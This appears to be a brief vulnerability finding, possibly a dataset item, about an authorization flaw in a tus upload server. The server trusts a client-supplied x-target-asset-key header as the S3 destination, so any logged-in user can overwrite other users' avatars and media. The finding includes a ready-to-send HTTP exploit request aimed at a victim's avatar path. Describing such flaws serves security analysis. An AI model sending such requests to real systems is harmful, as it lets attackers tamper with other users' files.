diagnosis: The tus server's custom namingFunction directly returns the client-provided header x-target-asset-key to specify the S3 key destination. It does not check if req.session.userId is authorized to write to that asset path, allowing any authenticated user to overwrite other users' profile banners, avatars, or media files.
exploit_request:
POST /tus/assets HTTP/1.1
Host: media.cdnportal.com
Cookie: session=attacker_session_cookie
Upload-Length: 40960
x-target-asset-key: avatars/usr_victim_4401/profile.png
Content-Type: application/offset+octet-stream
